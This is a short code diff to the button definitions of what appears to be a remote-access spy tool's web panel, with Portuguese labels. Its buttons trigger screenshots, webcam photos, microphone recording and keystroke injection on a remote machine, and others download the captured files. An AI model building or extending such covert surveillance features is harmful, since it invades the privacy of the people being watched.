@@ -31,10 +31,10 @@ buttons.push(new Button("Mostrar Mensagem",          "btn-dark",     "#interacti
 buttons.push(new Button("Digitar Mensagem",          "btn-dark",     "#interaction","getPrompt('Mensagem:','!TT ??', false);"));
 buttons.push(new Button("Combinação de Teclas",      "btn-dark",     "#interaction","getPrompt('Combinação (Separador: +):','!TC ??', false);"));
 buttons.push(new Button("ScreenShot",                "btn-success",  "#spy",        "putIn('!PS');"));
-buttons.push(new Button("Tirar Foto",                "btn-success",  "#spy",        "putIn('!WEB');"));
+buttons.push(new Button("Tirar Foto",                "btn-success",  "#spy",        "putIn('!WC');"));
 buttons.push(new Button("Gravar Microfone",          "btn-success",  "#spy",        "getPrompt('Segundos: ','!RA ??', false);"));
 buttons.push(new Button("Obter ScreenShot",          "btn-danger",   "#spy",        "window.location.href = '/download/ps.png'"));
-buttons.push(new Button("Obter Foto",          "btn-danger",   "#spy",        "window.location.href = '/download/web.png'"));
+buttons.push(new Button("Obter Foto",                "btn-danger",   "#spy",        "window.location.href = '/download/web.png'"));
 buttons.push(new Button("Obter Audio",               "btn-danger",   "#spy",        "window.location.href = '/download/output.wav'"));
 
 // Display buttons on Page
